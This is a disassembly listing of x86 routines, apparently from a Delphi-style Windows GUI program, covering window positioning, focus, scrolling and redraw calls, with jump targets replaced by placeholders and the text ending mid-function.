pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_452c2e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403370
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44d894
sub_452c48
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_452c70
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464dc0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464ca8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403370
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_452c70
test al al
jne r-xdata
sub_452cd8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452c70
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454f88
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452d04
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452c70
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454f88
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452d30
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_452d58
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464dc0
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464ca8
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403370
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_452d58
test al al
jne r-xdata
sub_452dc0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452d58
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452de0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452d58
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452e20
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_464dc0
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403370
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_452e20
test al al
jne r-xdata
sub_452e84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_452e20
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452ea4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_450b10
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44e7e8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_452ea4
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_452f54
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_452ea4
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_464dc0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44e7e8
test eax eax
jne r-xdata
sub_452ffc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_45301c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453050
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_451a9c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453070
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_4530c0
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_4530e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_44c900
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_450b4c
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_450b10
mov dl [ esp ]
mov si 0xffd1
call sub_403370
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_45313c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403370
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_453160
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403370
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_453198
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f2bc
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_450bac
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_4513bc
sub_4531d0
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403370
pop esi
pop ebx
retn
mov eax ebx
call sub_44dc78
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_4043ac
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_4043ac
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_453250
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45179c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44f390
sub_4532b0
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_451510
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_45090c
pop ebx
retn
sub_4532e0
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_453308
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_45090c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_453378
push ebx
mov ebx eax
mov eax ebx
call sub_44f1fc
mov eax ebx
call sub_454120
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_450bac
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_423a58
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44e7e8
sub_4533b4
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_44bee0
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_453e1c
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44e7e8
sub_4533f4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_454120
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453e1c
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_453434
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_450bac
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_453d24
sub_453474
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_453f5c
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_453f5c
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_4534d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_44e244
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_44d178
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_451708
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_453544
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f334
mov edx esi
mov eax ebx
call sub_450b6c
pop esi
pop ebx
retn
sub_453560
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_44a570
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_464dc0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403370
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403370
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403370
test al al
jne r-xdata
sub_4535f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_454f88
mov edx esi
mov eax ebx
call sub_453560
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44e7e8
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44e7e8
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44e7e8
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464dc0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44e7e8
test eax eax
jne r-xdata
jmp r-xdata
sub_4536d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44e7e8
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_45372c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44e7e8
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464dc0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44e7e8
test eax eax
jne r-xdata
sub_453778
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_453560
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44e7e8
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464dc0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44e7e8
test eax eax
jne r-xdata
sub_4537d4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_464dc0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44e7e8
mov [ esi + 0xc ] eax
sub_453808
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_454120
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_454120
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_44cc88
mov eax ebx
mov si 0xffd0
call sub_403370
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44cfd4
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4538e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_450b4c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_450b10
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403370
inc edi
dec ebx
jne r-xdata
sub_453928
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4506b4
xor eax eax
push ebp
push sub_4539c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4538e0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44d250
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4539cd
mov eax [ ebp - 0x4 ]
call sub_4506bc
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4539d4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_4506dc
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_450b10
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_453ac4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_418304
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_418198
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_418324
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_4182a8
call sub_453e1c
jmp r-xdata
mov eax ebp
mov edx esi
call sub_4182a8
call sub_453e1c
sub_453b9c
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_453ac4
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_453bfc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_453e1c
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_453e1c
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
test eax eax
jne r-xdata
sub_453c60
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_44e7e8
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
mov eax ebx
call sub_450b4c
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_450b10
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_450b10
test [ eax + 0x52 ] 0x4
je r-xdata
sub_453d24
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_44cfd4
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_453d5c
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_464dc0
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_453d9c
push ebx
mov ebx eax
mov eax ebx
call sub_464dc0
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_468c24
pop ebx
retn
mov eax ebx
call sub_464de8
mov eax ebx
call sub_453e1c
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_453dd4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_453df8
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_453df8
sub_453e30
push ebx
push esi
push edi
push ebp
mov ebx edx
